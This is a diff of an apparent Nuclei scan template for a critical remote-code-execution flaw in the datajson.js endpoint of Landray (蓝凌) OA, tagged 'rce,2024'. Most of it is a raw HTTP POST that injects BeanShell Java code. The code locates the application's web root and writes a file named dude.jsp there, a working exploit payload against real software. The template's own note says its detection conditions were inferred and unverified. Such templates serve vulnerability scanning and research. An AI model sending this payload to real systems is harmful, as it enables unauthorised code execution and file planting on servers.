@@ -3,22 +3,14 @@ info:
   name: 蓝凌 OA datajson.js 存在反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gnqucew6bsw48yhc
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gnqucew6bsw48yhc
-    fofa: 暂无
 http:
 - raw:
   - 'POST /data/sys-common/datajson.js HTTP/1.1
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     s_bean=sysFormulaValidate&script=import%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass("bsh.Interpreter");String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split("WEB-INF")[0]%2B"/dude.jsp");f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer("RHVkZQ=="));fout.close();return%201;&type=int&modelName=test
